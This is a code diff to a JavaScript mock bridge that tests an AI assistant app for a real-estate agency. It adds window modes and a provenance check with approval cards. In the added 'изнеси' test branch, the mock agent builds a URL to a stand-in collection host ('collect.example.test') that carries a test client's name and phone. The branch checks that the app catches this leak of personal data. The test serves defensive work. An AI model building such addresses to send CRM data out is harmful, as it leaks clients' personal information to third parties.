@@ -11,8 +11,9 @@
 //              ?lib=1 (3 library items) · ?sched=1 (2 tasks, one missed) · ?video=ok|noengine|fail · ?browse=0
 //              ?agentStep=<ms> (pause between agent steps, default 160) · ?chats=<n> (n saved chats „Чат номер 1…n“,
 //              chat 1 the OLDEST by last activity but created last – checks the order of „Вижте всички…“)
+// 0.1.6 (§22): ?win=normal|bubble|mini (the window mode MAIN reports at start; ted.window.* change it and emit onMode)
 // Test hooks:  window.__tedMock = {calls, setConfirm(bool), setEmailOutcome("sent"|"setup"|"unknown"), expire(),
-//              setUpd(status), fireDue(id, missed), job(id), files()}
+//              setUpd(status), fireDue(id, missed), job(id), files(), setWinMode(mode)}
 // Magic phrases in a chat message: "квота" -> quota error · "имейл" -> e-mail preview card ·
 //   "справка" -> all steps succeeded · "неуспех" -> all steps failed · "сървърна грешка" -> HTTP 502 ·
 //   "дълъг" -> a long answer (TTS chunking). Real GPT: "лимит" -> usage_limit · "повторен вход" -> reauth.
@@ -22,7 +23,14 @@
 //   version with an SVG chart · "имейл" -> e-mail draft card · attached files -> read_document + reworked .docx ·
 //   0.1.5: "обяв" -> a ChatGPT-style listings table with real links and inline photos (`images` events) ·
 //   "изтегли" -> fetch_image FileCards + the same photos inline · "чужда" -> a picture NOT from a tool result (chip) ·
+//   0.1.5 provenance, hybrid rule (§9.3 rules 8–9, MAIN's own electron/agent/provenance.js): "по сайтовете" -> a
+//   listings sweep over four model-built site search pages (no „web“ card in a chat without CRM data, also in a
+//   follow-up; with "клиент" in the question the test client is read from the CRM first – then one card per site,
+//   „Разреши за този сайт“ holds for the rest of the chat) · "изнеси" -> a CRM read + a model-built address with the
+//   test client's phone and name, twice (exactly one STRICT card: only „Разреши“/„Откажи“, asked once per answer) ·
 //   anything else -> web_search → read_page → CRM properties.search → create_document + approval calendar.create.
+
+import { createSensitive, hostOf, typedView, urlHaystack } from "../../electron/agent/provenance.js";
 
 const params = new URLSearchParams(typeof location !== "undefined" ? location.search : "");
 const num = (v, d) => (v != null && v !== "" && Number.isFinite(Number(v)) ? Number(v) : d);
@@ -48,6 +56,7 @@ const OPT = {
   chats: Math.max(0, Math.min(200, num(params.get("chats"), 0))),
   // 0.1.5 speed checks: two saved chats „Дълъг чат А/Б“ with <n> question/answer pairs each (Markdown answers).
   long: Math.max(0, Math.min(400, num(params.get("long"), 0))),
+  win: ["normal", "bubble", "mini"].includes(params.get("win")) ? params.get("win") : "normal",
 };
 
 const iso = (daysAgo) => new Date(Date.now() - daysAgo * 86400000).toISOString();
@@ -266,14 +275,18 @@ export function createMockBridge() {
   const libSubs = new Set();
   const dueSubs = new Set();
   const updSubs = new Set();
+  const modeSubs = new Set();
+  let winMode = OPT.win; // 0.1.6 „Балонче“: what MAIN would report (a browser page cannot hide or float)
   const pending = new Map(); // requestId -> abort()
-  const approvals = new Map(); // approvalId -> {requestId, resolve}
+  const approvals = new Map(); // approvalId -> {requestId, finish, approval}
   const emittedImages = new Set(); // picture addresses the mock agent emitted as `images` (MAIN's provenance)
+  const webChats = new Map(); // chatId -> {hosts, private, sens}: allowed sites, CRM data seen, sensitive values (as MAIN's chat memory)
   const calls = {
     chat: [], confirmSend: 0, tts: [], transcribe: 0, openExternal: [], openInChatGpt: [], browseImageClicked: [], copy: [], saveFile: [], rgSend: [], rgSignIn: [], casesCreate: [], remember: [], forget: [], read: [],
     consent: [], approve: [], filesAdd: [], projAssign: [], projAnswer: [], projZip: [], projCrm: [], filesRead: [], filesOpen: [], filesSave: [], filesExtract: [], filesForget: [], browseTest: [], browseImage: [],
     videoPrepare: [], videoStart: [], videoCancel: [], videoFinish: [], libRemove: [], libClear: 0, schedSave: [], schedRemove: [],
     updCheck: 0, updAuto: [], updDownload: 0, updInstall: 0, storage: 0, clearTemp: 0, reportProblem: 0,
+    window: [], // 0.1.6: "bubble" | "miniChat" | "restore", in order
     // Every call that MAIN would turn into a request to imotinadezhda.bg or its Supabase host (speed/load checks).
     site: [],
   };
@@ -599,7 +612,7 @@ export function createMockBridge() {
       const timer = setTimeout(() => finish({ decision: "deny", timeout: true }), 600000);
       const onAbort = () => finish({ decision: "deny", cancelled: true });
       ctl.wake.add(onAbort);
-      approvals.set(id, { requestId: rid, finish });
+      approvals.set(id, { requestId: rid, finish, approval });
       ev({ type: "approval", approval: { id, ...approval } });
     });
     const out = (text, extra = {}) => ({ ok: true, text, model: args.model, steps: [...steps.values()].map((s) => ({ ...s })), files: made.map((f) => ({ ...f })), ...extra });
@@ -720,6 +733,64 @@ export function createMockBridge() {
         ev({ type: "chatgpt", handoff: { id: nid("cg_test"), kind, prompt } });
         s.ok("картата е показана – нищо не е отворено");
         return finishText("Оттук не мога да създам " + (kind === "video" ? "видео" : "снимка") + " – това става в приложението ChatGPT с вашия план. Подготвих заявката по-долу: прегледайте я и натиснете „Отвори в ChatGPT“ (тестови данни).");
+      }
+
+      // 0.1.5 provenance, HYBRID rule (CONTRACT §9.3 rules 8–9) with MAIN's own detector: personal data in a model-built
+      // address → a strict card (only „Разреши“/„Откажи“); otherwise a model-built address asks only in a chat with CRM
+      // data – once per site („Разреши за този сайт“ = the rest of the chat); the same address is asked once per answer.
+      if (/по сайтовете|изнеси/.test(low)) {
+        const chatKey = typeof args.chatId === "string" && args.chatId ? args.chatId : null;
+        const fresh = !chatKey || !webChats.has(chatKey);
+        const chat = (chatKey && webChats.get(chatKey)) || { hosts: new Set(), private: false, sens: createSensitive() };
+        if (chatKey) { webChats.delete(chatKey); webChats.set(chatKey, chat); }
+        const sens = chat.sens;
+        const typed = typedView(args.messages.filter((m) => m.role === "user").map((m) => String(m.text || "")));
+        for (const m of args.messages) if (m.role === "assistant") sens.addPrivate(m.text, "names", { links: false });
+        // As MAIN: only a chat MAIN does not remember (a restart) counts numbers / e-mails of earlier answers as CRM data.
+        if (fresh) { const z = sens.size(); if (z.digits || z.emails) chat.private = true; }
+        const withClient = /клиент|изнеси/.test(low);
+        if (withClient) {
+          const s0 = mkStep("crm", "CRM: клиенти.преглед", { tool: "clients.get" });
+          if (await pause()) return stopped();
+          sens.addValue({ client: { id: "cl-test-a", name: "Тестов Клиент А", phone: "+359 877 555 444", email: "klient.a@example.test", note: "Тестова бележка" } });
+          chat.private = true;
+          s0.ok();
+        }
+        const exfil = "https://collect.example.test/c?n=" + encodeURIComponent("Тестов Клиент") + "&p=0877555444";
+        const urls = /изнеси/.test(low) ? [exfil, exfil] : [
+          "https://www.imot.bg/obiavi/prodazhbi/grad-testograd/tristaen", "https://www.olx.bg/nedvizhimi-imoti/q-тристаен-тестоград/",
+          "https://bazar.bg/obiavi/imoti?q=тристаен+тестоград", "https://www.alo.bg/obiavi/imoti-prodajbi/apartamenti-stai/?region_id=27",
+        ];
+        const decided = new Map();
+        let allowAll = false, opened = 0, refused = 0;
+        for (const u of urls) {
+          if (decided.get(u) === "deny") { refused++; continue; } // asked once: no card, no step
+          const host = hostOf(u);
+          const st = mkStep("read_page", "Чета страница: " + host + new URL(u).pathname);
+          if (decided.get(u) !== "allow") {
+            const hits = sens.find(urlHaystack(u), typed);
+            const card = hits.length
+              ? { kind: "web", title: "ChatGPT иска да отвори адрес с лични данни", allowAll: false, allowHost: false,
+                lines: [["Адрес", u], ["Сайт", host], ["Лични данни", hits.map((h) => h.shown).join(", ")], ["Защо питаме", "В адреса има данни от CRM, от файл или от по-ранен отговор, които не сте написали вие. Сайтът ще ги получи."]] }
+              : chat.private && !allowAll && !chat.hosts.has(host)
+                ? { kind: "web", title: "ChatGPT иска да отвори адрес, който сам е съставил", allowAll: true, allowHost: true, host,
+                  lines: [["Адрес", u], ["Сайт", host], ["Защо питаме", "В този чат има данни от CRM или файлове, а адресът не е от търсенето или от прочетена страница. С „Разреши за този сайт“ няма да питам повече за този сайт в чата."]] }
+                : null;
+            if (card) {
+              const d = await ask(card, st);
+              if (ctl.aborted) return stopped();
+              if (d.decision === "deny") { decided.set(u, "deny"); st.denied(); refused++; continue; }
+              decided.set(u, "allow");
+              if (d.decision === "allow_all") allowAll = true;
+              if (d.decision === "allow_host") chat.hosts.add(host);
+            }
+          }
+          if (await pause()) return stopped();
+          st.ok("тестова страница"); opened++;
+        }
+        return finishText((opened ? "Прегледах " + (opened === 1 ? "1 тестова страница" : opened + " тестови страници") : "Не отворих нито една страница")
+          + (refused ? ", " + refused + " адреса не са отворени – отказахте" : "") + "."
+          + (withClient ? " Клиентът е Тестов Клиент А, 0877 555 444 (тестови данни)." : " Обявите са тестови – без лични данни."));
       }
 
       // Internet listings like ChatGPT (0.1.5): a table with the REAL listing links, photos inline (their addresses came
@@ -999,9 +1070,12 @@ export function createMockBridge() {
       approve: async (args) => {
         const a = args || {};
         calls.approve.push({ approvalId: a.approvalId, decision: a.decision, ...(a.options ? { options: clone(a.options) } : {}) });
-        if (!["allow", "deny", "allow_all"].includes(a.decision)) return { ok: false, code: "invalid", error: "Невалидно решение." };
+        if (!["allow", "deny", "allow_all", "allow_host"].includes(a.decision)) return { ok: false, code: "invalid", error: "Невалидно решение." };
         const ap = approvals.get(a.approvalId);
         if (!ap || ap.requestId !== a.requestId) return { ok: false, error: "Няма такова чакащо потвърждение." };
+        // As MAIN (agent/loop.js approve): „всички“ only where the card offers it, „за този сайт“ only on a web card naming one site.
+        if (a.decision === "allow_all" && !(ap.approval && ap.approval.allowAll)) return { ok: false, error: "„Разреши всички“ не важи за това действие." };
+        if (a.decision === "allow_host" && !(ap.approval && ap.approval.kind === "web" && ap.approval.allowHost && ap.approval.host)) return { ok: false, error: "„Разреши за този сайт“ не важи за това действие." };
         if (a.options != null) {
           const o = a.options;
           if (typeof o !== "object" || typeof o.engine !== "string" || !Number.isFinite(o.duration)) return { ok: false, code: "invalid", error: "Невалиден избор за видео." };
@@ -1258,7 +1332,20 @@ export function createMockBridge() {
       },
       onChange: (cb) => sub(updSubs, cb),
     },
+    // 0.1.6 „Балонче“ (§22): the window modes, as MAIN answers them.
+    window: {
+      bubble: async () => setWin("bubble", "bubble"),
+      miniChat: async () => setWin("miniChat", "mini"),
+      restore: async () => setWin("restore", "normal"),
+      state: async () => ({ mode: winMode }),
+      onMode: (cb) => sub(modeSubs, cb),
+    },
   };
+  function setWin(fn, mode) {
+    calls.window.push(fn);
+    if (winMode !== mode) { winMode = mode; emit(modeSubs, { mode }); }
+    return { ok: true, mode };
+  }
 
   window.__tedMock = {
     calls,
@@ -1269,6 +1356,7 @@ export function createMockBridge() {
     fireDue: (id, missed = false) => { const t = tasks.find((x) => x.id === id); if (t) emit(dueSubs, { task: t, missed: !!missed }); },
     job: (id) => (jobs.has(id) ? publicJob(jobs.get(id)) : null),
     files: () => [...files.values()].map((f) => ({ ...f.ref, temporary: f.temporary })),
+    setWinMode: (mode) => { if (["normal", "bubble", "mini"].includes(mode) && mode !== winMode) { winMode = mode; emit(modeSubs, { mode }); } },
   };
   return bridge;
 }
